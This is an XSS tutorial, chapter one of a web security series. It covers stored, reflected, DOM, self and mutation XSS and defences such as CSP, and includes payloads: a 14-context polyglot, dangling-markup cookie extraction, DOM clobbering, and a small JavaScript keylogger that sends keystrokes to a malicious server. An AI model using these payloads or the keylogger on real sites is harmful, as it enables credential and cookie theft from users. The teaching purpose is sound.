## Security Series by StringManolo - Chapter 1: XSS

### 0. Prerequisites

Cross Site Scripting consists of injecting JavaScript code into a web page to compromise its security. In this series, I aim to show various ways to exploit security flaws, how to find them, write reports, build proof-of-concepts, and most importantly, help everyone learn something new.

**Prerequisites:**

To get the most out of the first chapter of this series, you should have basic to intermediate knowledge of core web technologies:
- At minimum: HTML, JavaScript, and the HTTP protocol
- Highly recommended: Basic understanding of DNS and web servers

If you don't have most of the mentioned knowledge but are interested in acquiring it, I recommend:
- Search and ask questions in forums
- W3Schools tutorials on HTML, JavaScript, and PHP
- Set up a LAMP stack to host your website, make it public, and capture HTTP requests

**Important notes:**

- I don't want to limit myself to basic things, but I also don't want to dive straight into complex topics. If you're an advanced user, I recommend skimming through and focusing on things you don't know
- The overall level of this chapter is basic to intermediate
- Google Chrome latest version is recommended (not strictly necessary)
- Having your own server for experimentation is recommended (also not strictly necessary)
- This series is divided into Chapters and Sections. All are independent, but advanced sections will likely reference concepts explained earlier
- Vulnerable pages that start with the domain `https://stringmanolo.github.io/xssSeries/` were created by me, and you have permission to attack them directly and test whatever you want manually

### 1. What is XSS?

XSS (Cross-Site Scripting) is the inclusion of JavaScript code in applications, websites, documents... with the capability to interpret it.

Example of a JavaScript script: `alert("hello")` which displays a message on screen.

Go ahead and try it on a [vulnerable page](https://stringmanolo.github.io/xssSeries/vulnerable.html).

However, if the page is secure, you'll see that it's not vulnerable.

As you can verify, if the page is poorly programmed, you can execute code on it. What risks does this pose beyond seeing a window with a message?

If an XSS vulnerability exists, code can be injected into the page to execute in a browser or in the browsers of thousands of users.

A keylogger (records the keys you press during your stay on the website) can be written in JavaScript in just a few lines of code:

```javascript
/* Keylogger (Android-iOS support) */
function keylogger() {
  var logs = "Keys:";
  var i = 0;
  window.onkeydown = function(e) {
    if (i++) {
      logs = "Key_Id=" + event.target.value.charAt(event.target.selectionStart -1).charCodeAt() + 
             "KeyChar=" + event.target.value.charAt(event.target.selectionStart -1) + "\n\n";
      new Image().src = maliciousServer + clientId + "/" + "keylogs=" + logs;
    }
  }
}
```

This means that if a login is vulnerable to XSS, your passwords can be stolen. It doesn't just apply to classic websites, but to all types of applications.

Considering that most websites are hosted on servers owned by the same companies, this is a completely transparent technique for a normal user. They won't observe anything that differs from the usual.

Redirections to advertising, scams, defacements, denial of service attacks are also common...

### 2. How do I know when a page is vulnerable?

There are several techniques and it depends on the circumstances.

If you're a novice programmer concerned about the security of your website, your best bet is to share the code in a forum so we can help you.

Worth mentioning here are tools like ZAP. If you're going to use it, do it with my domain `https://stringmanolo.github.io`. **Do not scan sites without permission.**

There are scanners of all types. Just as they can find vulnerabilities that people cannot, they can also overlook very obvious injection points. Someone with some experience can locate them in seconds.

If you're learning security, there's nothing better than entering code into the application and analyzing the source code using the **inspect element** feature in the browser.

On Android systems, you can view the source code by preceding the address with `view-source:` and/or using `javascript:` followed by JavaScript code.

To verify the security flaw, an `alert()` is introduced because it's easy to identify the code injection when the indicated message is displayed on screen. It's possible that they may be disabled in the page's own code.

Is this your case? Try manually typing `javascript:alert();` in the address bar. If it doesn't work, you can modify the page's code with the injected code to demonstrate the vulnerability.

### 3. What types of XSS exist?

There are 3 main types. This way of distinguishing is based on whether the data provided by the user is stored in the application, reflected, or executed directly on the client.

I add two more types: those that are modified by the browser, or those that one does to oneself (whether consciously or not).

### 4. Introduction to XSS Types

#### Stored XSS (stored cross-site scripting injection)

It's common for applications to store data whose origin is you. See username, email, location...

In the event that you manage to introduce code in your username that the browser interprets, all other users will interpret the code instead of viewing your username. All browsers are then subverted while they remain on the page that includes your code injection.

Observe here a [Stored XSS simulation](https://stringmanolo.github.io/xssSeries/storedXSS.html).

You can exploit it by registering with a name and adding `<svg onload=alert()>` as a payload that inserts an SVG element which, through the onload event, calls the JavaScript code opening the window.

#### Reflected XSS (reflected cross-site scripting injection)

When a page performs an operation and displays the information back, it's possible to achieve a reflected JavaScript injection.

The main characteristics of this security flaw are:
- This flaw is NOT included in the page permanently
- This flaw is generated as a response to a request/action you perform on the page itself

If you don't perform that action, you won't see your JavaScript code on the page. Here I offer you a [Reflected XSS simulation](https://stringmanolo.github.io/xssSeries/reflectedXSS.html).

You can see that the URL includes `#/search?q=<img onerror=confirm() src=nada>`. If you search for `<img onerror=confirm() src=nada>` on Google, you'll see something very similar.

You can directly write the search in the URL as follows: `https://google.com/search?q=<img onerror=confirm() src=nada>`.

The `q` after search is an HTTP parameter. When the server creates the code, it reflects (writes) that parameter within the page. If the parameter isn't modified to prevent the code from executing (Google does modify it), then the code is executed.

While Stored XSS is a flaw that can affect thousands of users since the injected code is included when visiting the page (doesn't require the user to enter code), reflected XSS is also dangerous since it can be exploited from a second website by redirecting users, potentially giving more control to a hypothetical malicious actor.

This flaw can not only be exploited through a URL (usually an HTTP request with GET method), but can also be exploited using the POST method by redirecting the application user when they submit a form with the code to the vulnerable website.

#### DOM XSS (document object model cross-site scripting)

JavaScript injections in the DOM are those that execute directly on the page and don't require a server to process, send, or include the injection.

Even intermediate-level users find this type of XSS problematic to understand. All the vulnerable pages you've seen so far are actually DOM XSS. At no point did the information you sent to the pages reach the server because they are emulated flaws.

All the code you "sent" to them was processed by JavaScript code that was already on the page.

- On the first page where you wrote `alert()`, a function called `eval` executed your code
- On the second vulnerable page, the code was stored in your browser; when you loaded the page again, it was the page's JavaScript code (not the server) that includes the code on the page for the browser to execute
- On the third vulnerable page, it's the JavaScript code that reads the address bar and puts the URL after the `=` on the page

In real cases of Stored XSS, the information is saved on the server and everyone can see it. And in the real case of Reflected XSS, it's the server that sends the reflected code.

Since DOM XSS executes using the page's existing code without interacting with the server, they are very dangerous flaws because the page owner has no way to log what happens.

To exploit this flaw, it's necessary to know the **sinks** (DOM functions and properties) that allow it. Some of the most common are:
- `innerHTML` and `outerHTML`
- `eval`
- `location`
- `document.cookie`

#### Self XSS (self-inflicted cross-site scripting)

I divide self XSS (injection to oneself) into 2: conscious self XSS and induced self XSS.

**Conscious Self XSS:**

When performing conscious self XSS, you try to exploit any of the other types of XSS through this. [Self XSS Example](https://stringmanolo.github.io/xssSeries/selfXSS.html).

As you can see, when you visit this page it returns your browser version. This information cannot be modified with JavaScript. But you can modify it with a proxy that intercepts HTTP requests or by modifying your browser configuration.

If you modify your userAgent and change it to code like in the last example, you'll achieve code execution.

The issue is that you have no way to modify this information for another user through JavaScript/HTML code. So what's the point of doing conscious self-XSS?

Usually not much. Utilities can be made to remove attributes like `pattern`, `required`, `max`, etc. Practically the same as with the browser console with the goal of facilitating the exploitation of other flaws.

**Induced Self XSS:**

On the other hand, induced self-XSS is a technique more akin to phishing than XSS. The goal of the technique is to trick a user into executing your code on the target page.

A crude example: "Go to Facebook login, enter your username and password and execute this code following these steps to be able to log in as administrator and see other users' messages."

I think both self-XSS types are at least worth mentioning. The first to avoid confusion if this flaw is found on a page, and the second to understand some of the limitations imposed on executing the `javascript:` pseudo-protocol (allows running JavaScript on the current website as well as exploiting other XSS).

#### mXSS (mutation cross-site scripting)

This is the rarest XSS to see. It's caused by a misinterpretation by the browser's parser when it reads the code and forms tags based on it.

For example, you could be putting an HTML string inside a script such that:

```javascript
<script>
var myText = `My favorite tags are <div> <img> and </script>
It's a shame they can't all be used together like this:
<div favoriteTags=</script><img onerror=alert() src= >and</div>>`;
alert(myText);
</script>
```

The browser when loading the page understands it as follows:

```javascript
<script>var myText = `My favorite tags are <div> <img> and </script>
It's a shame they can't all be used together like this:
<div favoriteTags=`></script>
<img onerror="alert()"><div></div>
alert(myText);
<script></script></body></html>
```

If you notice, what was previously JavaScript code (specifically a string) has now mutated to be HTML code, becoming interpreted as such and therefore allowing script execution.

This flaw is not an error in the page, nor is it the fault of the page's programmer, but rather a misinterpretation of what's on it by the browser. The mutation is not exclusive from JavaScript to HTML, but can mutate from CSS to HTML, from HTML to CSS, etc.

### 5. Encodings, Filters, Firewalls, Rules, Policies...

You now know what types of XSS exist. How are they prevented?

#### HTML Entities

HTML entities are an alternative way to represent dangerous characters that prevents their execution by the browser.

For example, if you put `&lt;` instead of `<` in your HTML code, the browser won't interpret the tag but visitors will see the `<` character.

The same can be done using the numbers that represent the character in the ASCII table. `<` is `&#60;`

#### X-XSS-Protection

This HTTP header sent by the server when sending the page indicates to the browser not to load a page if the browser itself detects an XSS attack.

It can be sent from PHP:
```php
header("X-XSS-Protection: 1; mode=block");
```

And from Apache:
```apache
<IfModule mod_headers.c>
Header set X-XSS-Protection "1; mode=block" 
</IfModule>
```

#### Content-Security-Policy

This HTTP header indicates what content your page allows and what it doesn't, as well as who can. This way, if an injection attempts to do something that's blocked in the policies, the browser will prevent it.

```
Content-Security-Policy: default-src 'none'; img-src 'self'; object-src 'none'; script-src 'self'; style-src 'self'; frame-ancestors 'none'; base-uri 'none'; form-action 'none';
```

You should also implement `X-Frame-Options` to prevent another very frequent vulnerability that allows clickjacking.

#### WAF

This is a technology (usually a server) that acts as a frontier receiving data entered by users with the goal of detecting attacks and taking configured measures. After analyzing requests, they are sent to the actual server.

### 6. Attacks and Techniques

#### Basic Techniques

**XSS (cross-site scripting injection)**

You've already seen this in section number 4.

**HTML injection**

This is an HTML code injection that does not include JavaScript code execution in any form.

A basic example is inserting a form pointing to a malicious server where the legitimate user is asked to enter their credentials, thinking they are communicating with the current page.

Redirections to other pages, defacements, phishing links are also common...

**FIX:** You can use htmlEntities on the input to prevent tags from being interpreted. In the case of frontend, you can use text nodes or use `.innerText`

**JavaScript injection**

This is a technique that allows you to inject JavaScript code to manipulate the behavior of a page or application.

A simple example is not losing lives in Google Chrome's offline dinosaur game. It has become quite popular to change the code of the die function so it does nothing when called.

This concept is applicable to security where code can be manipulated to obtain unexpected results, password theft, and more.

If data is being sent to a server, it can be manipulated.

**FIX:** The client can always be manipulated by design, even completely replaced without the server noticing. That's why all information coming from it must always be validated on the server.

**Inline JavaScript injection**

This is a JavaScript injection technique commonly used to achieve JavaScript execution in attributes and events.

For example:
- `<a href="javascript:alert('Hello')">Greet</a>`
- `<svg onload="alert('Hello')">`
- `<img onerror="alert('Hello')" src= >`

These are just some of the parameters that can execute JavaScript.

**FIX:** When possible, you should remove all YOUR inline JavaScript and JavaScript between script tags. You should move it to an external file. This way you can apply restrictive policies that block all JavaScript execution on the page and only allow its execution from your JavaScript files. The same applies to CSS, SVG, and other technologies that are not purely HTML.

**Alternative Attribute Separation**

Some filters assume that the only possible way to separate an attribute from the tag is to use spaces.

#### Intermediate Techniques

**Polyglots (multilanguage)**

These are codes created with the goal of being executed in multiple contexts. They are a powerful tool for blind testing in applications that don't have a system that blocks your injection.

```html
javascript:confirm()</xmp></script>'"</option></select></template></embed></noscript></style></textarea></title>'"><svg/onload=confirm()><img src=0 onerror=confirm()><META HTTP-EQUIV="refresh" CONTENT="4;url=data:text/html;base64,PHNjcmlwdD5jb25maXJtKCk8L3NjcmlwdD4=">
```

This polyglot executes in a minimum of 14 different contexts. Let's see both the separate payloads that gave rise to this polyglot, and the 14 contexts in which JavaScript execution is achieved:

```html
<!-- The class attribute is broken with "> leaving the svg inside the div and executing. -->
<div id="iPoint1" class="{{payload}}"></div>
<!-- Exploit: "><svg/onload=alert()> -->

<!-- The class attribute is broken with '> leaving the svg inside the div and executing. -->
<div id="iPoint2" class='{{payload}}'></div>
<!-- Exploit: '><svg/onload=alert()> -->

<!-- The title tag is closed allowing the svg to be injected outside of it. -->
<title id="iPoint3">{{payload}}</title>
<!-- Exploit: </title><svg/onload=alert()> -->

<!-- The textarea tag is closed leaving the svg outside the textarea and therefore going from text to html. -->
<textarea id="iPoint4">{{payload}}</textarea>
<!-- Exploit: </textarea><svg/onload=alert()> -->

<!-- The style tag is closed leaving the svg outside the style and therefore going from CSS code to HTML. -->
<style id="iPoint5">{{payload}}</style>
<!-- Exploit: </style><svg/onload=alert()> -->

<!-- The noscript tag is closed leaving the svg outside the noscript and therefore being able to execute inline javascript. -->
<noscript id="iPoint6">{{payload}}</noscript>
<!-- Exploit: </noscript><svg/onload=alert()> -->

<!-- The embed tag is closed leaving the svg outside and therefore the javascript executes. -->
<embed id="iPoint7">{{payload}}</embed>
<!-- Exploit: </embed><svg/onload=alert()> -->

<!-- The template tag is closed leaving the svg outside and therefore the javascript executes. -->
<template id="iPoint8">{{payload}}</template>
<!-- Exploit: </template><svg/onload=alert()> -->

<!-- The script tag is closed leaving the svg outside the script and therefore going from javascript code to html that executes the inline script. -->
<script id="iPoint9">{{payload}}</script>
<!-- Exploit: </script><svg/onload=alert()> -->

<!-- The option and select tags are closed leaving the svg outside and therefore the script executes. -->
<select id="iPoint10"><option>{{payload}}</option></select>
<!-- Exploit: </option></select><svg/onload=alert()> -->

<!-- The double quotes are closed and the script tag is closed making the svg go from being a javascript string to HTML code. -->
<script id="iPoint11">"{{payload}}"</script>
<!-- Exploit: </script>"<svg/onload=alert()> -->

<!-- The single quotes are closed and the script tag is closed making the svg go from being a javascript string to HTML code. -->
<script id="iPoint12">'{{payload}}'</script>
<!-- Exploit: </script>'<svg/onload=alert()> -->

<!-- The pseudo-protocol is used to execute the javascript code when the user uses the link. -->
<a id="iPoint13" href="{{payload}}"></a>
<!-- Exploit: javascript:alert() -->

<!-- A meta tag is used that allows javascript execution using the data: uri. -->
<head id="iPoint14">{{payload}}</head>
<!-- Exploit: <META HTTP-EQUIV="refresh" CONTENT="4;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg"> -->
```

The polyglot executes in all these contexts, facilitating blind XSS (blind injection).

**Dangling Markup Injection**

This is a type of injection that can serve to extract sensitive data to an external server.

This injection is based on not closing the quotes of an attribute so that all content until the next quote is included as the attribute's value.

It is NOT a JavaScript injection, it's an HTML injection. This technique is useful when sensitive information exists from the injection point where you inject your code, to the next quote.

[Dangling HTML Injection Example](https://stringmanolo.github.io/xssSeries/DanglingHtmlInjection.html)

The payload is:
```html
<a href=https://example.com/windowName.htm>If you want to use images anyway click me!</a><base target="
```

It works as follows: The `<base target="content">` changes the name property of the browser window. Since we don't close the attribute's content, the browser understands that everything until the next quote is the target's content.

Because the window name doesn't change when visiting another page, if the user clicks the link, code from the vulnerable page is included as the window name. Then the attacker only has to read the `window.name` property and save it on their server.

The vulnerable code is as follows:
```html
<div id="injectionPoint">${xssFilter(injectedUrl)}</div>
Secret Cookie (unique for each user):${cookie}
<div id="breakpoint"></div>
```

Where the first quote after our injection is after the cookie, so the cookie can be extracted as the value of the target attribute.

**FIX:** To prevent this flaw, you must include `<base target="_self">` before any injection point.

Be careful, target is not the only property that allows Dangling. `src` and `action` among others also allow it. Target specifically bypasses CSP policies.

#### Advanced Techniques

**DOM Clobbering**

This is a technique that consists of taking advantage of the fact that repeated elements/tags can be grouped into collections, becoming accessible as a property of window.

It's common for a programmer to implement code to check if an object already exists before defining it:
```javascript
let myObject = (window.myObject || {})
```

In cases where JavaScript execution is not allowed but HTML code injection is possible, this attack is possible if the object's properties are used for some action susceptible to being replaced by a property with possible malicious purposes.

[DOM Clobbering Example](https://stringmanolo.github.io/xssSeries/DOMClobbering.html)

In the example code, there's a `librarySecureLogin` object that contains a URL to an image called `login4PNG` as a property. To exploit the vulnerability, we inject a pair of `<a>` tags with an id equal to the name of the global object we want to create.

In the second tag, we define the name of the property used by the vulnerable code (`login4PNG`) using name, since name is both an attribute of `<a>` and also a property of HTMLCollection, which is the object we create by repeating the id.

We also define the attribute of the property. This way when the property is called, it will return the attribute it contains, which in this case is a URL to a harmless image.

```html
<a id=librarySecureLogin></a>
<a id=librarySecureLogin name=login4PNG href=https://stringmanolo.github.io/xssSeries/hacked.png></a>
```

If the vulnerable code obtains the src of a script this way, we can load our JavaScript file without violating the policy that prohibits inline JavaScript.

It's possible that if a well-implemented policy exists, resources from another origin cannot be loaded. In those cases, it should be checked if a CSP bypass is possible or host the resource in an allowed origin.

**FIX:** Avoid using `||` to check if a window property is defined.
